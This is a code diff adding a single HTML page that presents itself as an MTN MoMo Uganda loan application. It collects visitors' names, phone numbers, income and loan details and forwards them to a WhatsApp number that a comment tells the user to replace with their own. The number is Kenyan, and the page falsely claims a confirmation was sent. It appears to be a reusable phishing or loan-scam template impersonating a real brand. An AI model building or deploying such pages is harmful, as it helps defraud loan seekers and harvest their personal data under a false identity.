@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MTN MoMo Uganda - Loan</title>
+<style>
+  :root{--blue:#0A2E65;--yellow:#FFCC00;--bg:#F5F6F8}
+  *{box-sizing:border-box;font-family:Arial,sans-serif}
+  body{margin:0;background:var(--bg)}
+ .header{background:var(--blue);color:white;text-align:center;padding:25px}
+ .logo{background:var(--yellow);color:var(--blue);display:inline-block;font-weight:900;padding:6px 12px;border-radius:8px;font-size:28px}
+ .card{background:white;max-width:480px;margin:-20px auto 30px;padding:25px;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.08)}
+  h1{color:var(--blue);text-align:center;margin:0}
+ .step-text{text-align:center;color:#888;margin:5px 0 15px}
+ .progress{display:flex;gap:8px;margin-bottom:20px}
+ .progress span{height:6px;flex:1;background:#E5E7EB;border-radius:10px}
+ .progress span.active{background:var(--yellow)}
+  label{display:block;margin:14px 0 6px;font-weight:bold;color:#1F2A44}
+  input,select,textarea{width:100%;padding:14px;border:1.5px solid #D1D5DB;border-radius:10px;font-size:15px}
+ .error{display:none;background:#FEE2E2;color:#B91C1C;padding:10px;border-radius:8px;margin-bottom:10px}
+ .summary{border-left:5px solid var(--yellow);background:#FFFEF5;padding:15px;border-radius:12px;margin-top:15px}
+ .row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #eee;font-size:14px}
+ .btns{display:flex;gap:12px;margin-top:20px}
+  button{flex:1;padding:14px;border:none;border-radius:10px;font-weight:bold;cursor:pointer}
+ .btn-next{background:var(--blue);color:white}
+ .btn-back{background:#E5E7EB;color:#555}
+ .btn-start{background:var(--blue);color:white;width:100%}
+</style>
+</head>
+<body>
+<div class="header">
+  <div class="logo">MM</div>
+  <div style="color:var(--yellow);font-weight:bold;">MTN MoMo Uganda</div>
+</div>
+<div class="card" id="form-card"></div>
+
+<script>
+// >>> CHANGE THIS TO YOUR WHATSAPP NUMBER (without +) e.g. 254723224995
+const MY_WHATSAPP_NUMBER = "254723224995";
+
+let data = { amount: 1000000, term: '48 Months' };
+let step = 0;
+
+function render(){
+  const card = document.getElementById('form-card');
+  if(step===0){
+    card.innerHTML = `
+      <h1>Welcome to MTN<br>MoMo Uganda</h1>
+      <p style="text-align:center;color:#666;">Get loans easily through MTN MoMo Uganda</p>
+      <div style="border:1px solid #eee;padding:15px;border-radius:12px">
+        <div class="row"><span>Amount</span><b style="color:#FFCC00">UGX ${Number(data.amount).toLocaleString()}</b></div>
+        <input type="range" min="500000" max="5000000" step="100000" value="${data.amount}" oninput="data.amount=this.value;render()" style="width:100%;accent-color:#FFCC00">
+        <div style="background:#F9FAFB;padding:12px;border-radius:10px;margin-top:12px;display:flex;justify-content:space-between;align-items:center;">
+          <span style="color:#666;">Monthly Payment</span><span style="color:#FFCC00;font-weight:900;font-size:22px;">UGX ${Math.round(data.amount/48).toLocaleString()}</span>
+        </div>
+      </div>
+      <div style="margin-top:20px"><button class="btn-start" onclick="step=1;render()">START APPLICATION</button></div>
+    `;
+  }
+  if(step===1){
+    card.innerHTML = `
+      <h1>Loan Application</h1><div class="step-text">Step 1 of 3</div>
+      <div class="progress"><span class="active"></span><span></span><span></span></div>
+      <div class="error" id="err">X Please complete all fields.</div>
+      <label>Loan Type</label><select id="type"><option>Business Loan</option><option>Personal Loan</option></select>
+      <label>Loan Amount (UGX)</label><input type="number" id="amount" value="${data.amount}">
+      <label>Loan Term</label><select id="term"><option>12 Months</option><option>24 Months</option><option selected>48 Months</option></select>
+      <label>Purpose of Loan</label><textarea id="purpose" placeholder="Describe the purpose of your loan...">${data.purpose||''}</textarea>
+      <div class="btns"><button class="btn-next" onclick="validateStep1()" style="width:100%">NEXT STEP</button></div>
+    `;
+  }
+  if(step===2){
+    card.innerHTML = `
+      <h1>Loan Application</h1><div class="step-text">Step 2 of 3</div>
+      <div class="progress"><span class="active"></span><span class="active"></span><span></span></div>
+      <label>First Name</label><input id="fname" placeholder="First Name">
+      <label>Last Name</label><input id="lname" placeholder="Last Name">
+      <label>Phone Number (Uganda)</label><div style="display:flex"><span style="padding:14px;border:1.5px solid #D1D5DB;border-right:0;border-radius:10px 0 0 10px;background:#F9FAFB;">+256</span><input id="phone" placeholder="670123456" style="border-radius:0 10px 10px 0"></div>
+      <div class="btns"><button class="btn-back" onclick="step=1;render()">BACK</button><button class="btn-next" onclick="validateStep2()">NEXT STEP</button></div>
+    `;
+  }
+  if(step===3){
+    card.innerHTML = `
+      <h1>Loan Application</h1><div class="step-text">Step 3 of 3</div>
+      <div class="progress"><span class="active"></span><span class="active"></span><span class="active"></span></div>
+      <label>Employment Status</label><select id="emp"><option>Self-employed</option><option>Employed</option></select>
+      <label>Annual Income (UGX)</label><input id="income" placeholder="Enter annual income">
+      <div class="summary">
+        <h3 style="margin:0 0 10px">Application Summary</h3>
+        <div class="row"><span>Loan Amount:</span><b>UGX ${Number(data.amount).toLocaleString()}</b></div>
+        <div class="row"><span>Term:</span><b>${data.term}</b></div>
+        <div class="row"><span>Purpose:</span><b>${data.purpose||'-'}</b></div>
+        <div class="row"><span>Applicant:</span><b>${data.fname} ${data.lname}</b></div>
+      </div>
+      <div class="btns"><button class="btn-back" onclick="step=2;render()">BACK</button><button class="btn-next" onclick="submitToWhatsApp()">SUBMIT APPLICATION</button></div>
+    `;
+  }
+  if(step===4){
+    card.innerHTML = `
+      <h1 style="color:green">✓ Application Received!</h1>
+      <div style="background:#ECFDF5;padding:20px;border-radius:12px;text-align:center;margin:15px 0;">
+        <p><b>Thank you for your message.</b><br>Your request will be processed as soon as possible.</p>
+        <p style="font-size:13px;color:#555;">Loan: UGX ${Number(data.amount).toLocaleString()}<br>Applicant: ${data.fname} ${data.lname}<br>Phone: +256${data.phone}</p>
+      </div>
+      <p style="text-align:center;font-size:13px;">We have sent a confirmation to your WhatsApp</p>
+      <a href="https://wa.me/254753016569" style="display:block; background:green; color:white; text-align:center; padding:14px; border-radius:10px; text-decoration:none; font-weight:bold;">SUBMIT TO WHATSAPP</a>
+    `;
+  }
+}
+function validateStep1(){
+  const p=document.getElementById('purpose').value;
+  if(!p){document.getElementById('err').style.display='block';return;}
+  data.amount=document.getElementById('amount').value;
+  data.term=document.getElementById('term').value;
+  data.type=document.getElementById('type').value;
+  data.purpose=p; step=2; render();
+}
+function validateStep2(){
+  const f=document.getElementById('fname').value,l=document.getElementById('lname').value,ph=document.getElementById('phone').value;
+  if(!f||!l||ph.length!=9){alert('Please complete all fields');return;}
+  data.fname=f; data.lname=l; data.phone=ph; step=3; render();
+}
+function submitToWhatsApp(){
+  data.emp=document.getElementById('emp').value;
+  data.income=document.getElementById('income').value;
+
+  const adminMsg = `*NEW LOAN APPLICATION - MTN MoMo Uganda*%0A%0A*Loan Details*%0A- Type: ${data.type}%0A- Amount: UGX ${Number(data.amount).toLocaleString()}%0A- Term: ${data.term}%0A- Purpose: ${data.purpose}%0A%0A*Applicant Details*%0A- Name: ${data.fname} ${data.lname}%0A- Phone: +256${data.phone}%0A- Employment: ${data.emp}%0A- Income: UGX ${data.income}%0A%0A*Date:* ${new Date().toLocaleString()}`;
+
+  window.open(`https://wa.me/${MY_WHATSAPP_NUMBER}?text=${adminMsg}`, '_blank');
+  setTimeout(()=>{ step=4; render(); }, 800);
+}
+render();
+</script>
+</body>
+</html>
